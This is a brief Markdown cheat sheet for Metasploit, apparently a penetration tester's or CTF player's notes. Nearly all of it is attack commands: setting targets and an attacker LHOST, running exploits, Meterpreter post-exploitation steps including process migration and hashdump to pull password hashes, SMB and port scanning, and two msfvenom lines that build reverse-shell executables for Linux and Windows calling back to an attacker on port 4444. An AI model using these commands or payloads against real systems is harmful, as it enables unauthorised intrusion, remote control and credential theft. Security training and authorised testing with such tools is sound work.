# Metasploit / msfconsole

## Basics
```bash
msfconsole -q
search <keyword/cve>
use <module_path>
show options
set RHOSTS <IP>
set LHOST <attacker_ip>
set PAYLOAD <payload>
exploit / run
```

## Sessions & Meterpreter
```bash
sessions -l
sessions -i <id>
background
# داخل meterpreter
sysinfo
getuid
ps
migrate <pid>
hashdump
```

## Useful auxiliary
```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
```

## msfvenom (payload generation)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
```
